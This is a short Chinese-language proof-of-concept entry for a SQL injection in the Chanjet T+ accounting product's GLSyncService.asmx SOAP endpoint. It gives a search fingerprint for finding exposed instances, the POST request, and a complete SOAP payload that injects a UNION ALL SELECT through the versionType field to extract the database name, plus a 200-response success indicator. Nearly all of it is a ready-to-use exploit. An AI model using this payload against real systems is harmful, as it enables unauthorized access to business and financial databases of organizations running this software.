# 畅捷通-TPlus-GLSyncService存在sql注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/GLSyncService.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetSourceAccountDataTable xmlns="http://www.chanjet.com/">
<versionType>' UNION ALL SELECT NULL,db_name(),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VsIH</versionType>
</GetSourceAccountDataTable>
</soap:Body></soap:Envelope>
```
- **响应特征**：200